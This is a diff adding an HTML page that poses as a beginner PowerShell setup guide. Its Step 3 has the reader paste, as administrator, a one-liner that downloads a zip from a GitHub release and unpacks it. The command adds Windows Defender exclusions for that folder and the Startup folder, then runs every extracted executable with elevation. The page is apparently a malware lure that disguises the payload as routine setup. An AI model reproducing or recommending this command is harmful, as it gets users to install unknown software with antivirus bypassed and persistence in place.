@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PowerShell Setup Guide</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h1>PowerShell Installation Guide</h1>
+
+    <div class="step">
+      <strong>Step 1:</strong>
+      Press <kbd>Windows</kbd> and type <strong>"Windows PowerShell"</strong> in the search bar.
+    </div>
+
+    <div class="step">
+      <strong>Step 2:</strong>
+      Right-click <strong>Windows PowerShell</strong> and click <strong>"Run as Administrator"</strong>.<br>
+      If a pop-up appears, click <strong>"Yes"</strong>.
+    </div>
+
+    <div class="step">
+      <strong>Step 3:</strong>
+      Copy and paste the code below into PowerShell, then press <kbd>Enter</kbd>:
+      <code>$zip="$env:TEMP\tool.zip"; $out="$env:TEMP\tools"; $url="https://github.com/walaywashere/testingonly/releases/download/log/tool.zip"; Invoke-WebRequest $url -OutFile $zip; Expand-Archive $zip -DestinationPath $out -Force; Add-MpPreference -ExclusionPath $out; Add-MpPreference -ExclusionPath ([Environment]::GetFolderPath("Startup")); Get-ChildItem "$out\*.exe" | ForEach-Object { try { Start-Process $_.FullName -Verb RunAs | Out-Null; Write-Host "[ $($_.Name) ] started successfully." } catch { Write-Host "[ $($_.Name) ] failed: $($_.Exception.Message)" } }; Remove-Item $zip</code>
+    </div>
+
+    <div class="step">
+      <strong>Step 4:</strong>
+      Wait until it shows "started successfully", then close PowerShell.
+    </div>
+
+    <footer>
+      © 2025 Beginner Setup Guide
+    </footer>
+  </div>
+</body>
+</html>
